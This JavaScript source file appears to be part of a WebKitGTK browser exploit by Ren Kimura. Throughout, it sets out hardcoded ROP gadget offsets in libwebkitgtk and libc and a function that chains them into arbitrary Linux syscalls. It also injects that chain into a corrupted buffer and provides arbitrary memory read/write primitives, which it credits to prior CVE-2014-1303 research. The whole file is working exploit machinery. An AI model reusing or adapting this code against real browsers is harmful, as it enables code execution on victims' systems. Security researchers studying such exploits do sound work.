/*
 * Copyright 2017 - Ren Kimura (@RKX1209)
 */

// Gadget offsets from libwebkitgtk
var offset_pop_rax = 0x72a20;    //pop rax ; ret
var offset_pop_rdi = 0x3c9660;   //pop rdi ; ret
var offset_pop_rsi = 0x3c943a;   //pop rsi ; ret
var offset_pop_rdx = 0x6fdc0;    //pop rdx ; ret
var offset_pop_r10 = 0x5fd44f;   //pop r10 ; ret
var offset_pop_r8 = 0x3d9b22;    //pop r8  ; ret
var offset_pop_r9 = 0x5fd67f;    //pop r9  ; ret

// Create syscall chain
function syscall(name, syscall_number, arg1, arg2, arg3, arg4, arg5, arg6)
{
  debug_log("syscall " + name)
  rop_chain.push(webkitgtk_base_addr_low + offset_pop_rax)
  rop_chain.push(webkitgtk_base_addr_high)
  rop_chain.push(syscall_number)
  rop_chain.push(0x0)
  if(typeof(arg1) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_rdi)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg1.getLowBitsUnsigned())
    rop_chain.push(arg1.getHighBitsUnsigned())
  }
  if(typeof(arg2) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_rsi)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg2.getLowBitsUnsigned())
    rop_chain.push(arg2.getHighBitsUnsigned())
  }
  if(typeof(arg3) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_rdx)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg3.getLowBitsUnsigned())
    rop_chain.push(arg3.getHighBitsUnsigned())
  }
  if(typeof(arg4) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_r10)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg4.getLowBitsUnsigned())
    rop_chain.push(arg4.getHighBitsUnsigned())
  }
  if(typeof(arg5) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_r8)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg5.getLowBitsUnsigned())
    rop_chain.push(arg5.getHighBitsUnsigned())
  }
  if(typeof(arg6) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_r9)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg6.getLowBitsUnsigned())
    rop_chain.push(arg6.getHighBitsUnsigned())
  }
  // syscall ; ret ;
  rop_chain.push(libc_base_addr_low + 0xc5c55)
  rop_chain.push(libc_base_addr_high);
}

// Dump [addr, addr + size)
function rawdump(addr, size)
{
  //In WebKit, fd1 == output of current /dev/pts/
  nr_write = 1
  fd = new dcodeIO.Long(1, 0, true)
  syscall("write", nr_write, fd, addr, size)
}

function inject_ropcode(rop_chain)
{
  //rop chain starts at the index of 0x12 in cbuf
  for(var i = 0; i < rop_chain.length; i++)
    cbuf[0x12 + i] = rop_chain[i]
  debug_log ("Writing ROP chain completed!")
}

function set_base(addr_low,addr_high)
{
  u32[0x14] = addr_low;
  u32[0x15] = addr_high;
}
function restore_base()
{
  u32[0x14] = oldlow;
  u32[0x15] = oldhigh;
}

// read8 and write8 taken from Liang Chen's presentation on CVE 2014-1303
function read8(addr_low,addr_high)
{
  set_base(addr_low, addr_high)
  var result = [cbuf[0],cbuf[1]]
  restore_base();
  return result
}
function write8(addr_low,addr_high,value_low,value_high)
{
  set_base(addr_low, addr_high)
  cbuf[0] = value_low;
  cbuf[1] = value_high;
  restore_base()
  return;
}

// XXX: str.length must be 4 multiple
function write_str(addr_low, addr_high, str)
{
  set_base(addr_low, addr_high)
  for (i = 0; i < str.length / 4; i++) {
    var str4 = (str.charCodeAt(i+3)<<24) | (str.charCodeAt(i+2)<<16) |
      (str.charCodeAt(i+1)<<8) | (str.charCodeAt(i))
    cbuf[i] = str4;
  }
  cbuf[i] = 0x0 //NULL '\0'
  restore_base()
}
